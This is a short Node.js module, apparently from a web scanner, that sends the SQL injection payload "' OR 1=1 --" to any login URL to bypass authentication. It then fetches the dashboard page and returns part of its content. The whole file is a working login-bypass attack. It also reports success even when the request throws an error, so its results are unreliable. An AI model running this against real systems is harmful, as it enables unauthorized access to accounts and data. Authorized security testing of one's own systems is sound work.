const axios = require('axios');
exports.scan = async (url) => {
  console.log(`[AUTH] Scanning ${url}`);
  if (url.includes('login')) {
    try {
      const res = await axios.post(url, { username: "' OR 1=1 --", password: "any" });
      if (res.status === 200) {
        const follow = await axios.get(url.replace('/login', '/dashboard'));
        return { found: true, dump: follow.data.slice(0, 200) };
      }
    } catch {}
    return { found: true, dump: "Login bypass attempted" };
  }
  return { found: false };
};
